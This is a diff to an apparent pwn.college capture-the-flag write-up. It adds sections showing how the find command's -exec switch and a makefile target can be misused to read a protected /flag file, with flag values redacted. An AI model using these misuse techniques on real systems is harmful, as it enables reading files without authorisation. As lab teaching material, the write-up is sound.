@@ -351,10 +351,36 @@ pwn.college{xxxxxxxxFLAGxxxxxxxx}
 
 ## 25. `find`
 
-`find` command in Linux helps us to find files or directories in Linux.
+`find` command in Linux helps us to find files or directories in Linux. Now normally `find` command is not used to read a file but the `-exec` switch can be used to execute another command if the file we are looking for is found. The `\;` sign is required to terminate the `-exec` command.
 
 ```bash
-
+hacker@program-misuse~find:/challenge$ find / -type f -name 'flag' -exec cat /flag \;
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
 ```
+
+
+## 26. `make`
+
+`make` command in Linux is used for automating the task of building a binary from the source code. A special **makeFile** is created specially for the `make` command which tells it how the source code is linked and how to form the binary.
+
+### makefile
+
+Below is the **makefile** containing the script which the `make` command will run. **readFlag** is the target which is basically the thing the `make` command needs to achieve. The filename should be **makefile** to avoid any unnecessary conflicts.
+
+```makefile
+readFlag:
+	@cat /flag
+```
+
+To read the contents of the **makefile** using the `make` command use the `-f` switch as shown below and get your flag.
+
+```bash
+hacker@program-misuse~make:~$ make -f makefile
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+
+
 
 
